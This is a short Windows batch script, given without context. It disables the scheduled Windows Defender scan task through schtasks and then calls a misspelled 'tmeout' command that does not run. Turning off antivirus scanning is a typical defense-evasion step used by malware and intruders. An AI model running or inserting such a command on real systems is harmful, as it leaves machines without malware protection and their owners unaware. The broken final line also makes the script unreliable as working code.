@echo off
schtasks /change /disable /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"
tmeout /t 5
